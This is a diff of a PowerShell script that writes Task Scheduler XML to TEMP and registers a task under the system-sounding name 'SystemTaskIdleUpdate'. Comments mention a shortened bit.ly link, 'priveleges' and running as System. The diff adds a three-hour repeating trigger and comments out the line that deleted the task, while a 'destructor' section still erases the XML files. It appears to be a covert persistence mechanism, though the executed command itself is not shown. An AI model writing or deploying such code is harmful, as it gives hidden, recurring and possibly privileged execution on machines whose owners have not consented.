@@ -1,8 +1,8 @@
 #
-#SystemTaskIdle 'http://bit.ly/1MImxuL', Temprorary when Idle
+#SystemTaskIdleUpdate 'http://bit.ly/1MImxuL', Temprorary when Idle
 #
 
-$f=$env:TEMP;$f+='\SystemTaskIdle.xml';
+$f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
 $s = '<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
@@ -52,7 +52,7 @@ $s+='</Exec>
 </Task>';
 
 $s > $f;
-schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdle.xml" /tn "SystemTaskIdle";
+schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdleUpdate.xml" /tn "SystemTaskIdleUpdate";
 
 $s = '';
 $s > $f;
@@ -60,7 +60,6 @@ $s > $f;
 #
 #priveleges
 #
-
 
 
 
@@ -78,7 +77,12 @@ $s+=$env:username+'</Author>
   </RegistrationInfo>
   <Triggers>
     <TimeTrigger>
-      <StartBoundary>2015-10-16T23:21:00</StartBoundary>
+      <Repetition>
+        <Interval>PT3H</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <ExecutionTimeLimit>PT15M</ExecutionTimeLimit>
+      <StartBoundary>2015-10-16T23:59:00</StartBoundary>
       <Enabled>true</Enabled>
     </TimeTrigger>
   </Triggers>
@@ -127,12 +131,12 @@ $s > $f;
 #destructor
 #
 
-del $env:TEMP"\SystemTaskIdle.xml";
+del $env:TEMP"\SystemTaskIdleUpdate.xml";
 del $env:TEMP"\SystemTask.xml";
 
 #
-#SystemTaskIdle to \ru System
+#SystemTaskIdleUpdate to \ru System
 #
 
-schtasks.exe /Delete /tn "SystemTaskIdle"; #
+#schtasks.exe /Delete /tn "SystemTaskIdleUpdate"; #
 
